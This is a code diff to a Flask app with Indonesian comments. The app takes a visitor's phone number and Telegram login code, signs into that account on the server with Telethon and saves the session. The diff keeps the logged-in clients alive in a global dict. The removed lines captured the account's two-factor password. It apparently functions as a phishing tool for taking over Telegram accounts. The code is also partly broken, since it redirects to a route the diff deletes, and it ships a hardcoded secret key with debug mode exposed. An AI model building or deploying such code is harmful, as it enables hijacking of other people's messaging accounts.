@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for, session, flash, make_response
+from flask import Flask, request, render_template, redirect, url_for, flash, make_response, session
 from telethon import TelegramClient, errors
 import asyncio
 
@@ -10,7 +10,7 @@ app.secret_key = 'supersecretkey'
 
 client_dict = {}
 phone_code_hash_dict = {}
-
+clients = {}  # Variabel global untuk menyimpan instance TelegramClient
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -22,7 +22,6 @@ def index():
         loop.run_until_complete(send_otp(phone_number))
         return redirect(url_for('confirm_otp'))
     return render_template('index.html')
-
 
 @app.route('/confirm_otp', methods=['GET', 'POST'])
 def confirm_otp():
@@ -42,16 +41,6 @@ def confirm_otp():
             return redirect(url_for('confirm_otp'))
     return render_template('confirm_otp.html', phone_number=phone_number)
 
-
-@app.route('/enter_password', methods=['GET', 'POST'])
-def enter_password():
-    if request.method == 'POST':
-        password = request.form['password']
-        session['password'] = password
-        return redirect(url_for('confirm_otp'))
-    return render_template('enter_password.html')
-
-
 async def send_otp(phone_number):
     client = TelegramClient(f'session_{phone_number}', api_id, api_hash)
     await client.connect()
@@ -69,7 +58,6 @@ async def send_otp(phone_number):
             return
     await client.disconnect()
 
-
 async def confirm_otp_async(phone_number, otp):
     client = TelegramClient(f'session_{phone_number}', api_id, api_hash)
     await client.connect()
@@ -79,8 +67,10 @@ async def confirm_otp_async(phone_number, otp):
             await client.sign_in(phone_number, code=otp, phone_code_hash=phone_code_hash)
 
             if await client.is_user_authorized():
-                await client.start(phone_number)
+                await client.start()
                 print(f"Sesi disimpan untuk nomor {phone_number}")
+                # Simpan instance TelegramClient ke dalam variabel global
+                clients[phone_number] = client
             else:
                 raise errors.SessionPasswordNeededError()
 
@@ -88,13 +78,11 @@ async def confirm_otp_async(phone_number, otp):
         return handle_password_needed(phone_number)
     except Exception as e:
         print(f"Error saat mengkonfirmasi OTP: {e}")
-    finally:
-        await client.disconnect()
-
+    # Jangan menutup sesi
+    # await client.disconnect()
 
 def handle_password_needed(phone_number):
     return redirect(url_for('enter_password'))
-
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", debug=True)
